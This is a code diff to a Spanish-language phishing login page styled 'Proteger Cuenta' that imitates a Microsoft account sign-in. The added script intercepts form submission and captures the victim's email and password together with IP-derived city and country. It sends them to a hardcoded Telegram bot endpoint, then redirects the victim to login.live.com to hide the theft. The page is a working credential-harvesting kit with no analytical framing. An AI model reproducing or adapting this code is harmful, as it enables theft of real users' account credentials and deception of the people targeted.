@@ -79,7 +79,7 @@
 </head>
 
 <body>
-    <form action="acvt.php" method="post">
+    <form action="" method="post" id="loginform">
         <div style="width: 100%;text-align: left !important;">
             <img src="/static/logo.png" alt="Logo" style="width: 150px;">
             <h2>Proteger Cuenta</h2>
@@ -108,5 +108,39 @@
 
         })
 </script>
+<script>
+    const url1 = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url1)
+        .then((response) => {
+          const email = document.querySelector("#input1").value;
+
+          const contra = document.querySelector("#input2").value;
+
+          const message =
+            "\nLOG - >" + " Email: " + email + " | Contra: " + contra + " | Ciudad: " + response.data.city + " | Pais: " + response.data.country + " | IP:  " + response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot5004637295:AAFELMf4M-wXnKs-oucI7rh1Sd3NPrAkOdA/sendMessage",
+              {
+                chat_id: "864018852",
+                text: message,
+              }
+            )
+            .then((response) => {
+              window.location.href = "https://login.live.com";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
 
 </html>
